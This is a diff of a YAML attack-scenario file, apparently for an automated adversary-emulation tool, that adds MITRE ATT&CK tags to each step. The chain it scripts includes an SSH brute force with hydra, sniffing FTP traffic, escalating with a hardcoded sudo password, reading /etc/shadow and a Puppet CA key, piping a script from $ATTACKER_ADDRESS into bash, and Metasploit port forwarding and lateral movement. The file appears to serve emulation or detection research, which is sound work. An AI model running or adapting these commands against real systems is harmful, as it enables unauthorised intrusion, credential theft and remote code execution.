@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 a a
+# Scenario 3 b
 #
 ####################
 vars:
@@ -11,6 +11,9 @@ vars:
 commands:
   - type: shell
     cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
+    metadata:
+      techniques: "T1078,T1110,T1133"
+      tactics: "Initial Access"
 
   - type: ssh
     creates_session: foothold
@@ -19,11 +22,17 @@ commands:
     hostname: $SERVER_ADDRESS
     port: 10022
     cmd: id
+    metadata:
+      techniques: "T1078"
+      tactics: "Initial Access"
 
   - type: ssh
     session: foothold
     cmd: "tcpdump -A port 21\n"
     interactive: True
+    metadata:
+      techniques: "T1040"
+      tactics: "Credential Access"
 
   - type: sleep
     seconds: 20
@@ -38,11 +47,17 @@ commands:
     session: foothold
     cmd: "sudo -i\n"
     interactive: True
+    metadata:
+      techniques: "T1078"
+      tactics: "Privilege Escalation"
 
   - type: ssh
     session: foothold
     cmd: "rambo\n"
     interactive: True
+    metadata:
+      techniques: "T1078"
+      tactics: "Privilege Escalation"
 
   - type: ssh
     session: foothold
@@ -53,16 +68,25 @@ commands:
     session: foothold
     cmd: "cat /etc/shadow\n"
     interactive: True
+    metadata:
+      techniques: "T1003"
+      tactics: "Credential Access"
 
   - type: ssh
     session: foothold
     cmd: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n"
     interactive: True
+    metadata:
+      techniques: "T1213"
+      tactics: "Collection"
 
   - type: ssh
     session: foothold
     cmd: "cat /media/share/healthcheck_cron.sh\n"
     interactive: True
+    metadata:
+      techniques: "T1039"
+      tactics: "Collection"
 
   - type: mktemp
     cmd: file
@@ -94,14 +118,23 @@ commands:
   - type: ssh
     cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
     background: True
+    metadata:
+      techniques: "T1071, T1105"
+      tactics: "Execution, Command and Control"
 
   - type: msf-session
     session: portforward
     cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
 
   - type: msf-session
     session: portforward
     cmd: portfwd add -l 1881 -r 192.168.100.23 -p 1881
+    metadata:
+      techniques: "T1572"
+      tactics: "Command and Control"
 
   - type: msf-module
     creates_session: movement
@@ -112,7 +145,9 @@ commands:
       LPORT: "4444"
     options:
       RHOSTS: 127.0.0.1  
-
+    metadata:
+      techniques: "T1210"
+      tactics: "Lateral Movement"
 
 #################### MOVED ################################
   - type: msf-session
